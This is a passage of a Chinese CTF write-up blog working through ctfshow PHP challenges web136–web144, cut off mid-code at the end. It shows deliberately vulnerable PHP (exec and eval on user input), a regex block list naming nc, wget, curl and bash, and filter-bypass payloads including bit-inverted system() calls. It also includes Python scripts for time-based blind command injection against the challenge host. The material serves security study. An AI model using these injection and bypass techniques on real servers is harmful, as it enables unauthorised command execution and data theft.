comment" spellcheck="true">//追加</span>tee <span class="token operator">-</span> <span class="token comment" spellcheck="true">//输出到标准输出两次 tee - - //输出到标准输出三次</span>tee file1 file2 <span class="token operator">-</span> <span class="token comment" spellcheck="true">//输出到标准输出两次,并写到那两个文件中</span>ls <span class="token operator">|</span> tee file另：把标准错误也被tee读取 ls “<span class="token operator">*</span>” <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">|</span> tee ls<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>ls \<span class="token operator">|</span>tee <span class="token number">1</span><span class="token comment" spellcheck="true">//将根目录下的内容写入1</span>访问<span class="token number">1</span>，下载文件发现f149_15_h3r3<span class="token operator">?</span>c<span class="token operator">=</span>nl <span class="token operator">/</span>f149_15_h3r3<span class="token operator">|</span>tee <span class="token number">1</span>访问<span class="token number">1</span>，下载文件得flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用类中函数，需要调用静态类</p><pre><code>php中 -&gt;与:: 调用类中的成员的区别-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法</code></pre><p>payload：<code>ctfshow=ctfshow::getFlag</code></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php特性：-1"><a href="#php特性：-1" class="headerlink" title="php特性："></a>php特性：</h3><p>考察了call_user_func()用数组形式调用类方法</p><p>详看：<a href="https://www.wodecun.com/blog/7981.html" target="_blank" rel="noopener">根据方法名调用call_user_func()详解</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>调用classname这个类里的sya_hello方法<span class="token keyword">array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$classname</span>  类名<span class="token keyword">array</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>say_hello   <span class="token function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p><pre class="line-numbers language-php"><code class="language-php">ctfshow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>ctfshow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web139——盲打-未实操"><a href="#web139——盲打-未实操" class="headerlink" title="web139——盲打(未实操)"></a>web139——盲打(未实操)</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">awk命令</a>：是一个强大的<strong>文本分析</strong>工具</p><pre class="line-numbers language-php"><code class="language-php">用awk命令、cut命令截取字符sleep命令确认是否正确awk <span class="token constant">NR</span><span class="token operator">==</span><span class="token number">2</span> 获取第二行信息cut <span class="token operator">-</span>c <span class="token number">1</span>  截取第<span class="token number">1</span>个字符zsh下<span class="token keyword">if</span>语句的格式： <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>condition<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span> elif <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考大佬的脚本：<br>获取文件名的脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> stringstr<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits    <span class="token comment" spellcheck="true">#生成所有字母与数字[a-zA-Z0-9]</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'9'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>    result<span class="token operator">+=</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜解文件内容的脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> stringstr<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span><span class="token comment" spellcheck="true">#获取小写字母与数字</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#time()第一个参数是响应时间，第二个是读取时间</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web140——松散比较"><a href="#web140——松散比较" class="headerlink" title="web140——松散比较=="></a>web140——松散比较==</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $f1($f2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP类型比较表</a> 可发现</p><p><strong><code>0==“字符串”</code> 返回的是TRUE</strong></p><p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">current</span><span class="token punctuation">(</span>localeconv<span class="token punctuation">)</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     因为<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html md5后开头的数字所以我们改用sha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web141——取反"><a href="#web141——取反" class="headerlink" title="web141——取反~"></a>web141——取反~</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank" rel="noopener">绕过无字母数字的方法参考yu师傅的脚本</a>：这里直接利用取反脚本</p><p>绕过return的方式：<br>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用<code>+</code>，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p><pre><code>system(tac f*);经过取反处理(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);payload：?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</code></pre><p>运行完直接报毒，关闭杀软后食用，此处会先进行url解码再匹配</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">0</span>       八进制<span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">0x0</span>        <span class="token number">16</span>进制<span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">0e123</span>    科学计数法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web143——异或"><a href="#web143——异或" class="headerlink" title="web143——异或^"></a>web143——异或^</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了在return中保证运算，我们需要用*来实现</p><h2 id="web144——取反-配合±号"><a href="#web144——取反-配合±号" class="headerlink" title="web144——取反~配合±号"></a>web144——取反~配合±号</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token 